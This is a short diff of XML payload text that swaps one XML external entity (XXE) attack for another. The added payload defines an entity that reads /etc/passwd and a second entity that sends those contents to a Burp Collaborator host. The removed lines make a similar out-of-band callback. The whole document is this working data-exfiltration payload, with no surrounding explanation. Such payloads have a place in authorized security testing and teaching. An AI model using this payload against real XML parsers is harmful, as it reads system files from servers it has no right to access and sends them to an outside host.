@@ -1,2 +1,8 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://mpfyay5yr9qkm459cley3gejjap4dt.burpcollaborator.net'>">
-%all;
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+<!ENTITY callhome SYSTEM "http://tnk58535pgorkb3gasc51ncqhhneb3.burpcollaborator.net/?%xxe;">
+]
+>
+<foo>&callhome;</foo>
